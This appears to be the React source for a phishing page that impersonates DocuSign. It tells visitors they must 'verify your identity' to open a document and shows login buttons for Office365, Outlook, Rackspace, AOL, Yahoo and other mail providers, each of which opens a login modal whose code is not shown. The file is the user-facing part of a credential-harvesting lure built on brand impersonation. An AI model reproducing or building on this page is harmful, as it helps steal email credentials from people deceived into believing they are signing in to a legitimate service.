import { useState } from "react";
import { DocusignLogo } from "./components/DocusignLogo";
import { EmailLoginButton } from "./components/EmailLoginButton";
import { LoginModal } from "./components/LoginModal";
export function App() {
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [selectedProvider, setSelectedProvider] = useState("");
    const handleEmailButtonClick = (provider: string) => {
        setSelectedProvider(provider);
        setIsModalOpen(true);
    };
    return (
        <div className="w-full min-h-screen bg-gradient-to-br from-teal-800 to-blue-900 flex justify-center items-center p-4">
            <div className="max-w-4xl w-full">
                <div className="flex items-center mb-6">
                    <DocusignLogo />
                    <h1 className="text-white text-3xl md:text-4xl font-bold ml-4">
                        Docusign
                    </h1>
                </div>
                <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-lg">
                    <p className="text-white text-md md:text-2xl font-medium mb-6">
                        For your security we need to verify your identity. To
                        gain access to this document, enter the email address
                        this document was sent to.
                    </p>
                    <p className="text-white text-lg mb-6">
                        Sign in to access document.
                    </p>
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                        <EmailLoginButton
                            provider="Office365"
                            color="bg-red-600"
                            onClick={() => handleEmailButtonClick("Office365")}
                        />
                        <EmailLoginButton
                            provider="Outlook"
                            color="bg-blue-600"
                            onClick={() => handleEmailButtonClick("Outlook")}
                        />
                        <EmailLoginButton
                            provider="Rackspace"
                            color="bg-black"
                            onClick={() => handleEmailButtonClick("Rackspace")}
                        />
                        <EmailLoginButton
                            provider="Aol"
                            color="bg-indigo-600"
                            onClick={() => handleEmailButtonClick("Aol")}
                        />
                        <EmailLoginButton
                            provider="Yahoo"
                            color="bg-purple-800"
                            onClick={() => handleEmailButtonClick("Yahoo")}
                        />
                        <EmailLoginButton
                            provider="Other Mail"
                            color="bg-blue-500"
                            onClick={() => handleEmailButtonClick("Other Mail")}
                            icon="@"
                        />
                    </div>
                </div>
            </div>
            {isModalOpen && (
                <LoginModal
                    provider={selectedProvider}
                    onClose={() => setIsModalOpen(false)}
                />
            )}
        </div>
    );
}
